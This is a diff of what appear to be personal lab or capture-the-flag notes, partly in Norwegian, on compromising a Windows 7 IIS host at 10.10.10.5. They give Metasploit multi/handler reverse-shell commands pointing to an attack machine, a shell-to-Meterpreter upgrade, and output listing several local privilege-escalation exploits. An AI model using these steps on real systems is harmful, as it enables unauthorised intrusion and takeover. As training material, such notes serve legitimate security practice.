@@ -38,27 +38,49 @@ The command completed with one or more errors.
 
 iis apppool\web
 
-fikk shell med https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
+fikk shell med [https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/](https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/)
 
 prøve å escalata nå da
 
-windows 7 6.1 build 7600 
+windows 7 6.1 build 7600
 
 oppgradere fra nc til metasploit til meterpreter
 
-- use mutli/handler
+* use mutli/handler
 
-- set LHOST attack-machine
+* set LHOST attack-machine
 
-- set LPORT port-as-appropraite
+* set LPORT port-as-appropraite
 
-- set payload windows/shell/reverse\_tcp
+* set payload windows/shell/reverse\_tcp
 
-- exploit'
+* exploit'
 
 background session med ctrl z&lt;
 
 use post/multi/manage/shell\_to\_meterpreter
+
+\[+\] 10.10.10.5 - exploit/windows/local/bypassuac\_eventvwr: The target appears to be vulnerable.
+
+\[+\] 10.10.10.5 - exploit/windows/local/ms10\_015\_kitrap0d: The target service is running, but could not be validated.
+
+\[+\] 10.10.10.5 - exploit/windows/local/ms10\_092\_schelevator: The target appears to be vulnerable.
+
+\[+\] 10.10.10.5 - exploit/windows/local/ms13\_053\_schlamperei: The target appears to be vulnerable.
+
+\[+\] 10.10.10.5 - exploit/windows/local/ms13\_081\_track\_popup\_menu: The target appears to be vulnerable.
+
+\[+\] 10.10.10.5 - exploit/windows/local/ms14\_058\_track\_popup\_menu: The target appears to be vulnerable.
+
+\[+\] 10.10.10.5 - exploit/windows/local/ms15\_004\_tswbproxy: The target service is running, but could not be validated.
+
+\[+\] 10.10.10.5 - exploit/windows/local/ms15\_051\_client\_copy\_image: The target appears to be vulnerable.
+
+\[+\] 10.10.10.5 - exploit/windows/local/ms16\_016\_webdav: The target service is running, but could not be validated.
+
+\[+\] 10.10.10.5 - exploit/windows/local/ms16\_032\_secondary\_logon\_handle\_privesc: The target service is running, but could not be validated.
+
+\[+\] 10.10.10.5 - exploit/windows/local/ppr\_flatten\_rec: The target appears to be vulnerable.
 
 
 
